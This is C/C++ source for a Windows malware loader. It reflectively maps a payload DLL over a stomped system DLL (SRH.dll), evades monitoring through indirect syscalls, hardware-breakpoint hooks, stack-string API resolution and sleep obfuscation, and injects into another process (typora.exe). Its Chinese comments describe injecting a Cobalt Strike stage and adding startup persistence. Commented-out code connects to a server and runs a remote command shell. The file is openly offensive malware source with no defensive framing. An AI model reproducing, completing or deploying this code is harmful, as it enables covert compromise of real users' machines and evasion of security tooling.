#include "pch.h"
#include "framework.h"
#include "types.h"
#include "headers.h"
#include "misc.h"
#include "hwbp.h"
#include "syscalls.h"
#include "swappala.h"
#include "sleaping.h"
#include <stdint.h>
#include "mylibc.h"
#include "net.h"
#include "utils.h"
#include "file.h"
#include "dll_headers.h"

typedef struct _SAC_DLL_HEADER
{
	HANDLE sac_dll_handle;
	HANDLE mal_dll_handle;
	SIZE_T payload_size;
	PBYTE to_free;

} SAC_DLL_HEADER, * PSAC_DLL_HEADER;

uintptr_t resolve_jmp_to_actual_function(void* func_addr)
{
	if (!func_addr) return 0;

	PBYTE code = (PBYTE)func_addr;

	// relative jmp
	if (code[0] == 0xE9)
	{
		int32_t relative_offset = *(int32_t*)(code + 1);

		void* next_instruction = (void*)((uintptr_t)func_addr + 5);
		void* actual_function = (void*)((uintptr_t)next_instruction + relative_offset);

		return (uintptr_t)actual_function;
	}

	// indirect jmp
	if (code[0] == 0xff && code[1] == 0x25)
	{
		// x64: FF 25 [32bits relative offset]
		uint32_t relative_offset = *(int32_t*)(code + 2);
		// 6 = FF25(2) + offset(4)
		void* import_table_addr = (void*)((uintptr_t)func_addr + 6 + relative_offset);

		void* actual_function = *(void**)import_table_addr;

		return (uintptr_t)actual_function;
	}

	return (uintptr_t)func_addr;
}


EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
{
	//PE HEADERS VARS
	PIMAGE_DOS_HEADER	img_dos_hdr = NULL;
	PIMAGE_NT_HEADERS	img_nt_hdrs = NULL;
	IMAGE_OPTIONAL_HEADER	ImgOptHdr = { 0 };
	IMAGE_FILE_HEADER img_file_hdr = { 0 };

	PIMAGE_SECTION_HEADER* pe_section_ptr_array = NULL;
	PIMAGE_IMPORT_DESCRIPTOR img_imp_desc = NULL;
	PIMAGE_THUNK_DATA64 original_first_thunk = NULL;
	PIMAGE_THUNK_DATA64 first_thunk = NULL;
	PIMAGE_IMPORT_BY_NAME pImgImportByName = NULL;
	PIMAGE_BASE_RELOCATION img_reloc = NULL;
	PBASE_RELOCATION_ENTRY reloc_entry = NULL;
	PIMAGE_RUNTIME_FUNCTION_ENTRY img_runtime_func_entry = NULL;
	PIMAGE_TLS_DIRECTORY img_tls_dict = NULL;
	PIMAGE_TLS_CALLBACK* tls_callbacks = NULL;



	//fix IAT vars
	HMODULE dll = NULL;
	FARPROC import_func_address = NULL;
	int import_func_ordinal = 0;


	//base relocation vars
	ULONG_PTR delta = NULL;
	int entries_count;

	//fix Memory Protection variables
	DWORD section_protection = 0x00;


	//locate DLL in memory
	PDLL_HEADER dll_hdr = NULL;
	ULONG_PTR current_module_base = NULL;

	//new PE in memory and memory to free once loaded
	PBYTE reflective_dll_base = NULL;
	PBYTE mem_to_free = NULL;

	//function prototpyes
	fnLoadLibraryA func_LoadLibraryA = NULL; //to fix the IAT
	fnRtlAddFunctionTable func_RtlAddFunctionTable = NULL;
	fnLoadLibraryExA func_LoadLibraryExA = NULL;//to load sac dll without resolving imports

	//stack strings for PIC
	WCHAR str_Kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
	WCHAR str_ntdll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
	WCHAR str_user32[] = { L'U', L's', L'e', L'r', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
	CHAR str_RtlAddFunctionTable[] = { 'R', 't', 'l', 'A', 'd', 'd', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', 'T', 'a', 'b', 'l', 'e', '\0' };
	CHAR str_LoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' };
	CHAR str_LoadLibraryExA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'E', 'x', 'A','\0' };
	CHAR str_GetProcessId[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd', '\0' };


	//stack strings and variables for HBP
	CHAR str_AddVectoredExceptionHandler[] = { 'A', 'd', 'd', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c', 'e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r', '\0' };
	CHAR str_RemoveVectoredExceptionHandler[] = { 'R', 'e', 'm', 'o', 'v', 'e', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c', 'e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r', '\0' };
	PVOID addr_ZwClose = NULL;
	PVOID addr_NtMapViewOfSection = NULL;
	PVOID addr_NtCreateSection = NULL;
	CHAR str_ZwClose[] = { 'Z','w','C','l','o','s','e','\0' };
	CHAR str_NtMapViewOfSection[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
	CHAR str_NtCreateSection[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };


	//NT status variable for syscall return code
	NTSTATUS status = 0x00;

	HMODULE hm_kernel32 = GMHR(str_Kernel32);
	HMODULE hm_ntdll = GMHR(str_ntdll);

	fnAddVectoredExceptionHanlder func_AddVectoredExceptionHandler = (fnAddVectoredExceptionHanlder)GPAR(hm_kernel32, str_AddVectoredExceptionHandler);
	fnRemoveVectoredExceptionHandler func_RemoveVectoredExceptionHandler = (fnRemoveVectoredExceptionHandler)GPAR(hm_kernel32, str_RemoveVectoredExceptionHandler);

	if ((func_LoadLibraryExA = (fnLoadLibraryExA)GPAR(hm_kernel32, str_LoadLibraryExA)) == NULL)
		return FALSE;
	if ((func_LoadLibraryA = (fnLoadLibraryA)GPAR(hm_kernel32, str_LoadLibraryA)) == NULL)
		return FALSE;
	if (!(func_RtlAddFunctionTable = (fnRtlAddFunctionTable)GPAR(hm_kernel32, str_RtlAddFunctionTable)))
		return FALSE;

	SYSCALL_ENTRY zw_func_s[AmountofSyscalls] = { 0 };
	retrieve_zw_func_s(GMHR(str_ntdll), zw_func_s);


	/* set hardware breakpoint and detour functions */
	func_AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)&VectorHandler);

	addr_ZwClose = GPAR(hm_ntdll, str_ZwClose);
	addr_NtMapViewOfSection = GPAR(hm_ntdll, str_NtMapViewOfSection);
	addr_NtCreateSection = GPAR(hm_ntdll, str_NtCreateSection);

	if (addr_ZwClose != NULL
		&& addr_NtCreateSection != NULL
		&& addr_NtMapViewOfSection != NULL
		)
	{
		set_hwbp(DrIndex::DR3, addr_NtCreateSection, zw_func_s);
		set_hwbp(DrIndex::DR2, addr_NtMapViewOfSection, zw_func_s);
		set_hwbp(DrIndex::DR1, addr_ZwClose, zw_func_s);
	}

	/* brute force reflective dll base address search */
	current_module_base = (ULONG_PTR)ReflectiveFunction;
	current_module_base &= ~((ULONG_PTR)0xFFF);

	while (TRUE)
	{
		img_dos_hdr = (PIMAGE_DOS_HEADER)(current_module_base);
		if (img_dos_hdr->e_magic == IMAGE_DOS_SIGNATURE)
		{
			img_nt_hdrs = (PIMAGE_NT_HEADERS)(current_module_base + img_dos_hdr->e_lfanew);

			if (img_nt_hdrs->Signature == IMAGE_NT_SIGNATURE)
				break;
		}

		current_module_base -= 0x1000;
	}


	// here it still needs to be adjusted because there are the headers in
	// between, check some lines later

	if (!current_module_base)
		return FALSE;


	mem_to_free = (PBYTE)current_module_base;

	PIMAGE_OPTIONAL_HEADER img_opt_hdr = (PIMAGE_OPTIONAL_HEADER)((ULONG_PTR)img_nt_hdrs
		+ sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)); // skip nt_hdrs->Signature

	img_file_hdr = img_nt_hdrs->FileHeader;

	/*------------------------------LOADING SACRIFICAL DLL---------------------*/

	PBYTE sac_dll_base = NULL;
	CHAR sac_dll_path[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\','S','R','H','.','d','l','l','\0' };

	HMODULE sac_dll_module_by_LoadLibrary = NULL;
	sac_dll_module_by_LoadLibrary = func_LoadLibraryExA(sac_dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);

	unset_hwbp(DrIndex::DR1);
	unset_hwbp(DrIndex::DR2);
	unset_hwbp(DrIndex::DR3);

	func_RemoveVectoredExceptionHandler((PVECTORED_EXCEPTION_HANDLER)&VectorHandler);

	sac_dll_base = (PBYTE)sac_dll_module_by_LoadLibrary;

	/* parse sacrificial dll to retrieve the size */
	PIMAGE_DOS_HEADER sac_dll_img_dos_hdr_ptr = NULL;
	PIMAGE_NT_HEADERS sac_dll_img_nt_hdr_ptr = NULL;
	PVOID sac_dll_mem_addr = NULL;
	SIZE_T sac_dll_payload_size = NULL;
	ULONG sac_dll_u_old_protection = NULL;

	if (sac_dll_base == NULL)
	{
		return FALSE;
	}

	sac_dll_img_dos_hdr_ptr = (PIMAGE_DOS_HEADER)sac_dll_base;
	if (sac_dll_img_dos_hdr_ptr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	sac_dll_img_nt_hdr_ptr = (PIMAGE_NT_HEADERS)(sac_dll_base + sac_dll_img_dos_hdr_ptr->e_lfanew);
	if (sac_dll_img_nt_hdr_ptr->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	sac_dll_mem_addr = (PVOID)(sac_dll_base);

	// OptionalHeader.SizeOfImage records the memory size occupied by the loaded dll in memory.
	sac_dll_payload_size = (SIZE_T)sac_dll_img_nt_hdr_ptr->OptionalHeader.SizeOfImage;


	HANDLE sac_dll_handle = find_SRH_DLL_section_handle(zw_func_s, (fnGetProcessId)GPAR(hm_kernel32, str_GetProcessId));
	if (sac_dll_handle == FALSE || sac_dll_handle == (HANDLE)(-1))
		return 0;

	PVOID sac_dll = NULL;
	HANDLE dll_file = NULL;
	HANDLE new_section_handle = NULL;
	SIZE_T view_size = NULL;

	sac_dll_payload_size = sac_dll_payload_size + 32;

	// size of sacrifical dll( SRH.dll) + 32
	LARGE_INTEGER section_size = { sac_dll_payload_size };

	// create new section, which size is the size of sacrifical dll( SRH.dll) plus 32
	if (status = ZwCreateSection(
		&new_section_handle,
		SECTION_ALL_ACCESS,
		NULL,
		&section_size,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		NULL,
		zw_func_s[ZwCreateSectionF].SSN,
		zw_func_s[ZwCreateSectionF].sysretAddr
	) != 0)
		return FALSE;

	// unmap the view of section of the SRH.dll mapped by LoadLibraryExA()
	if (status = ZwUnmapViewOfSection(
		((HANDLE)(LONG_PTR)-1),
		sac_dll_module_by_LoadLibrary,
		zw_func_s[ZwUnmapViewOfSectionF].SSN,
		zw_func_s[ZwUnmapViewOfSectionF].sysretAddr
	) != 0)
		return FALSE;

	// re-map the dll to first loaded address.
	sac_dll = (PVOID)sac_dll_module_by_LoadLibrary;
	if (status = ZwMapViewOfSection(
		new_section_handle,
		((HANDLE)(LONG_PTR)-1),
		&sac_dll,			// anticipated address
		NULL,
		NULL,
		NULL,
		&sac_dll_payload_size, // mapped size
		ViewUnmap,
		NULL,
		PAGE_EXECUTE_READWRITE,
		zw_func_s[ZwMapViewOfSectionF].SSN,
		zw_func_s[ZwMapViewOfSectionF].sysretAddr
	) != 0)
		return FALSE;

	// fixing the base address including the 16 bytes of header.
	// skip the custom header

	reflective_dll_base = (PBYTE)sac_dll;
	custom_memcpy_classic(reflective_dll_base, &sac_dll_handle, sizeof(HANDLE));
	reflective_dll_base += sizeof(HANDLE);
	custom_memcpy_classic(reflective_dll_base, &new_section_handle, sizeof(HANDLE));
	reflective_dll_base += sizeof(HANDLE);
	custom_memcpy_classic(reflective_dll_base, &sac_dll_payload_size, sizeof(SIZE_T));
	reflective_dll_base += sizeof(SIZE_T);
	custom_memcpy_classic(reflective_dll_base, &mem_to_free, sizeof(PBYTE));
	reflective_dll_base += sizeof(PBYTE);


	// allocate memory to record the current pe section header pointers
	PVOID pe_section_ptr_buf = NULL;
	SIZE_T s_size = 0x0;
	s_size = sizeof(PIMAGE_SECTION_HEADER) * img_file_hdr.NumberOfSections;

	if ((status = ZwAllocateVirtualMemory(
		((HANDLE)(LONG_PTR)-1),
		&pe_section_ptr_buf,
		0,
		&s_size,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE,
		zw_func_s[ZwAllocateVirtualMemoryF].SSN,
		zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr
	)) != 0)
		return FALSE;

	pe_section_ptr_array = (PIMAGE_SECTION_HEADER*)pe_section_ptr_buf;

	if (pe_section_ptr_array == NULL)
		return FALSE;

	for (int i = 0; i < img_file_hdr.NumberOfSections; i++)
	{
		pe_section_ptr_array[i] = (PIMAGE_SECTION_HEADER)(((PBYTE)img_nt_hdrs) + 4 + 20 + img_file_hdr.SizeOfOptionalHeader + (i * IMAGE_SIZEOF_SECTION_HEADER));
	}

	for (int i = 0; i < img_file_hdr.NumberOfSections; i++)
	{
		custom_memcpy_classic(
			(PVOID)(reflective_dll_base + pe_section_ptr_array[i]->VirtualAddress),
			(PVOID)(current_module_base + pe_section_ptr_array[i]->PointerToRawData),
			pe_section_ptr_array[i]->SizeOfRawData
		);
	}


	//char str_msvcp140d[] = { 'm', 's', 'v', 'c', 'p', '1', '4', '0', 'd', '.', 'd', 'l', 'l', '\0' };


	/* FIX IAT TABLE */
	for (size_t i = 0; i < img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR))
	{

		img_imp_desc = (PIMAGE_IMPORT_DESCRIPTOR)(reflective_dll_base + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + i);
		if (img_imp_desc->OriginalFirstThunk == NULL && img_imp_desc->FirstThunk == NULL)
			break;

		char* import_module_name = (LPSTR)(reflective_dll_base + img_imp_desc->Name);

		//if (str_icmp(import_module_name, str_msvcp140d))
		//    continue;

		dll = func_LoadLibraryA((LPSTR)(reflective_dll_base + img_imp_desc->Name));
		if (dll == NULL)
			return FALSE;

		original_first_thunk = (PIMAGE_THUNK_DATA64)(reflective_dll_base + img_imp_desc->OriginalFirstThunk);
		first_thunk = (PIMAGE_THUNK_DATA64)(reflective_dll_base + img_imp_desc->FirstThunk);

		while (original_first_thunk->u1.Function != NULL && first_thunk->u1.Function != NULL)
		{
			if (original_first_thunk->u1.Ordinal & 0x8000000000000000)
			{
				import_func_ordinal = original_first_thunk->u1.Ordinal & 0xFFFF;
				import_func_address = GPARO(dll, (int)import_func_ordinal);
				if (import_func_address != nullptr)
					first_thunk->u1.Function = (ULONGLONG)import_func_address;
			}
			else
			{
				pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(reflective_dll_base + original_first_thunk->u1.AddressOfData);
				import_func_address = GPAR(dll, pImgImportByName->Name);
				if (import_func_address != nullptr)
					first_thunk->u1.Function = (ULONGLONG)import_func_address;
			}

			original_first_thunk++;
			first_thunk++;
		}

	}

	/* APPLE BASE RELOCATIONS */
	delta = (ULONG_PTR)reflective_dll_base - img_opt_hdr->ImageBase;
	img_reloc = (PIMAGE_BASE_RELOCATION)(reflective_dll_base + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

	while (img_reloc->VirtualAddress)
	{
		reloc_entry = (PBASE_RELOCATION_ENTRY)(img_reloc + 1);
		entries_count = (int)((img_reloc->SizeOfBlock - 8) / 2);

		for (int i = 0; i < entries_count; i++)
		{
			switch (reloc_entry->Type)
			{
			case IMAGE_REL_BASED_DIR64:
			{
				ULONGLONG* to_adjust = (ULONGLONG*)(reflective_dll_base + img_reloc->VirtualAddress + reloc_entry->Offset);
				*to_adjust += (ULONGLONG)delta;
			}
			break;
			case IMAGE_REL_BASED_HIGHLOW:
			{
				DWORD* to_adjust = (DWORD*)(reflective_dll_base + img_reloc->VirtualAddress + reloc_entry->Offset);
				*to_adjust += (DWORD)delta;
			}
			break;
			case IMAGE_REL_BASED_HIGH:
			{
				WORD* to_adjust = (WORD*)(reflective_dll_base + img_reloc->VirtualAddress + reloc_entry->Offset);
				*to_adjust += HIWORD(delta);
			}
			break;
			case IMAGE_REL_BASED_LOW:
			{
				WORD* to_adjust = (WORD*)(reflective_dll_base + img_reloc->VirtualAddress + reloc_entry->Offset);
				*to_adjust += LOWORD(delta);
			}
			break;
			case IMAGE_REL_BASED_ABSOLUTE:
				break;

			default:
				break;
			}

			reloc_entry += 1;
		}

		img_reloc = (PIMAGE_BASE_RELOCATION)(reinterpret_cast<DWORD_PTR>(img_reloc) + img_reloc->SizeOfBlock);

	}


	/* Adjust memory protections basing on section headers. */
	PVOID mem_addr_for_syscall = NULL;
	SIZE_T payload_size_for_syscall = NULL;
	ULONG u_old_protection = NULL;

	for (int i = 0; i < img_file_hdr.NumberOfSections; i++)
	{

		if ((SIZE_T)pe_section_ptr_array[i]->SizeOfRawData == 0)
			continue;

		// write
		if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
		{
			section_protection = PAGE_WRITECOPY;
		}

		//read
		if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_READ)
		{
			section_protection = PAGE_READONLY;
		}

		// execute
		if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE)
		{
			section_protection = PAGE_EXECUTE;
		}

		// read and  write
		if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_READ
			&& pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
		{
			section_protection = PAGE_READWRITE;
		}

		// execute and write
		if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE
			&& pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
		{
			section_protection = PAGE_EXECUTE_WRITECOPY;
		}
		if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_READ
			&& pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE)
		{
			section_protection = PAGE_EXECUTE_READ;
		}
		if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_READ
			&& pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE
			&& pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
		{
			section_protection = PAGE_EXECUTE_READWRITE;
		}

		mem_addr_for_syscall = (PVOID)(reflective_dll_base + pe_section_ptr_array[i]->VirtualAddress);
		payload_size_for_syscall = (SIZE_T)pe_section_ptr_array[i]->SizeOfRawData;

		if ((status = ZwProtectVirtualMemory(
			((HANDLE)(LONG_PTR)-1),
			&mem_addr_for_syscall,
			&payload_size_for_syscall,
			section_protection,
			&u_old_protection,
			zw_func_s[ZwProtectVirtualMemoryF].SSN,
			zw_func_s[ZwProtectVirtualMemoryF].sysretAddr
		)) != 0)
			return FALSE;

	}

	/* Register Exceptions handlers */
	if (img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size)
	{
		img_runtime_func_entry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(reflective_dll_base + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);
		if (!func_RtlAddFunctionTable(
			img_runtime_func_entry,
			(img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(PIMAGE_RUNTIME_FUNCTION_ENTRY)),
			(DWORD64)reflective_dll_base))
		{
			; // do nothing
		}
	}

	/* Execute TLS callbacks */
	if (img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size)
	{
		img_tls_dict = (PIMAGE_TLS_DIRECTORY)(reflective_dll_base + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
		tls_callbacks = (PIMAGE_TLS_CALLBACK*)(img_tls_dict->AddressOfCallBacks);

		int i = 0;
		while (tls_callbacks[i] != NULL)
		{
			tls_callbacks[i]((LPVOID)reflective_dll_base, DLL_PROCESS_ATTACH, NULL);
		}

	}


	/* Flushing Instruction Cache Alla Fewer */
	if ((status = ZwFlushInstructionCache(
		(HANDLE)-1,
		NULL, 0x00,
		zw_func_s[ZwFlushInstructionCacheF].SSN,
		zw_func_s[ZwFlushInstructionCacheF].sysretAddr)) != 0)
	{
		return FALSE;
	}

	__try {
		int x = 0;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
	}

	return reflective_dll_base;

}

EXTERN_DLL_EXPORT bool yolo()
{
	WCHAR kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
	CHAR str_create_thread[] = { 'C','r','e','a','t','e','T','h','r','e','a','d','\0' };

	fnCreateThread func_CreateThread = NULL;
	if ((func_CreateThread = (fnCreateThread)GPAR(GMHR(kernel32), str_create_thread)) == NULL)
		return FALSE;

	fnDllMain dll_main = NULL;
	PBYTE pebase = NULL;
	PIMAGE_DOS_HEADER img_dos_hdr = NULL;
	PIMAGE_NT_HEADERS img_nt_hdrs = NULL;


	ULONG_PTR dll_base_addr = NULL;

	// lea rax, [rip + 0x0]
	dll_base_addr = (ULONG_PTR)yolo;
	dll_base_addr &= ~((ULONG_PTR)0xFFF);

	while (TRUE)
	{


		img_dos_hdr = (PIMAGE_DOS_HEADER)(dll_base_addr);
		if (img_dos_hdr->e_magic == IMAGE_DOS_SIGNATURE)
		{
			img_nt_hdrs = (PIMAGE_NT_HEADERS)(dll_base_addr + img_dos_hdr->e_lfanew);

			if (img_nt_hdrs->Signature == IMAGE_NT_SIGNATURE)
			{
				break;
			}
		}

		dll_base_addr -= 0x1000;

	}

	if (!dll_base_addr)
		return FALSE;

	pebase = ReflectiveFunction();
	if (pebase == 0)
		return FALSE;


	PIMAGE_OPTIONAL_HEADER img_opt_hdr = (PIMAGE_OPTIONAL_HEADER)((ULONG_PTR)img_nt_hdrs
		+ sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)); // skip nt_hdrs->Signature

	dll_main = (fnDllMain)(pebase + img_opt_hdr->AddressOfEntryPoint);

	HANDLE h_thread = func_CreateThread(
		NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc,
		(LPVOID)dll_main, 0, NULL
	);


	if (h_thread == NULL)
		return FALSE;

	return TRUE;
}

static SOCKET connect_to_server(winsock_functions_t* ws_funcs, kernel32_functions_t* krnl_funcs)
{
	SOCKET socket = INVALID_SOCKET;

	socket = init_connection(SERVER_HOSTNAME, SERVER_PORT, ws_funcs);
	if (socket == INVALID_SOCKET)
	{
		cleanup_wsa(ws_funcs);
	}

	return socket;
}


static status_t custom_process_attach(HMODULE hModule)
{
	status_t status = 0;
	sleaping_para_t sleaping_para = { 0 };
	//sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_funcs

	PSAC_DLL_HEADER sac_dll_header = NULL;

	// even if unmapped it's in the PEB
	WCHAR sac_dll_path[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\','S','R','H','.','d','l','l', L'\0' };
	PBYTE sac_dll_base = (PBYTE)GetModuleHandleW(sac_dll_path);

	if (sac_dll_base == NULL)
		return ST_ERROR;

	sac_dll_header = (PSAC_DLL_HEADER)sac_dll_base;

	// retrieve the information left from the reflective loader
	HANDLE sac_dll_handle = sac_dll_header->sac_dll_handle;
	// retrieve handle of malware dll
	HANDLE mal_dll_handle = sac_dll_header->mal_dll_handle;
	SIZE_T sac_dll_size = sac_dll_header->payload_size;

	PBYTE old_memory = (PBYTE)sac_dll_header->to_free;

	// remove the very first buffer allocated for the reflective dll
	if (VirtualFree(old_memory, 0, MEM_RELEASE) == 0)
	{
		// error releasing old buffer
		return ST_ERROR;
	}



	// initialize functions 
	nt_functions_t nt_funcs = { 0 };
	if (!load_nt_functions(&nt_funcs))
	{
		return ST_ERROR;
	}

	sleaping_para.image_base = sac_dll_base;
	sleaping_para.sac_dll_handle = sac_dll_handle;
	sleaping_para.mal_dll_handle = mal_dll_handle;
	sleaping_para.view_size = sac_dll_size;
	sleaping_para.nt = &nt_funcs;

	// 修改注册表添加启动项
	//if (add_to_startup() != ST_SUCCESS)
	//	return FALSE;

	// 向其他进程注入CS的一阶段载荷
	// 拓展：可以让该DLL持久存在与进程中，并尝试向其他进程中注入各种恶意代码
    WCHAR str_notepad[] = { 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', L'\0' };
    WCHAR str_typora[] = { 't', 'y', 'p', 'o', 'r', 'a', '.', 'e', 'x', 'e', L'\0' };
	WCHAR str_explorer[] = { 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', L'\0' };
	inject(&nt_funcs, str_typora);



	do
	{
		//MessageBoxA(NULL, "swappala", "swappala", MB_ICONERROR);
		status = sleaping(&sleaping_para);
		if (ST_FAILED(status))
		{
			//MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
			break;
		}
	} while (true);



//	global_functions_t global_functions = { 0 };
//
//	if (!load_winsock_functions(&global_functions.ws2))
//	{
//		return ST_ERROR;
//	}
//	
//	if (!load_gdi32_functions(&global_functions.gdi32))
//	{
//		return ST_ERROR;
//	}
//
//
//	if (startup_wsa(&global_functions.ws2) != 0)
//	{
//		return ST_ERROR;
//	}
//
//	SOCKET socket = INVALID_SOCKET;
//
//	socket = init_connection(SERVER_HOSTNAME, SERVER_PORT, &global_functions.ws2);
//	if (socket == INVALID_SOCKET)
//	{
//		cleanup_wsa(&global_functions.ws2);
//		return ST_SOCKET_ERROR;
//	}
//
//	status = win_cmd(socket);
//	
//
//__cleanup_0:
//	cleanup_wsa(&global_functions.ws2);

	return status;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{

	if (ul_reason_for_call == 1)
	{
		return custom_process_attach(hModule);
	}

	return TRUE;

	//switch (ul_reason_for_call)
	//{
	//case DLL_PROCESS_ATTACH:
	//	return custom_process_attach(hModule);
	//case DLL_THREAD_ATTACH:
	//case DLL_THREAD_DETACH:
	//case DLL_PROCESS_DETACH:
	//	break;
	//}
	//return TRUE;
}

